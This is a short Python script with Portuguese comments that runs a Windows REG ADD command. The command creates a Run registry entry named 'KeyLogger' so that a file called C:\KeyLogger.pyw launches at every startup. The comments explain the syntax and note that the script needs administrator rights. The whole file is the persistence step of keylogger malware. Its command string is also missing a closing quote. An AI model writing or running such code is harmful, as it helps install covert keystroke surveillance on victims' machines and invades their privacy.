from os import system

system('REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v KeyLogger /t REG_SZ /d "C:\\KeyLogger.pyw')

#RED ADD Path_Registro /v Nome_no_Registro /t Tipo_registro /d Valor do Registro
# É necessário que o Script seja executado como Adminitrador
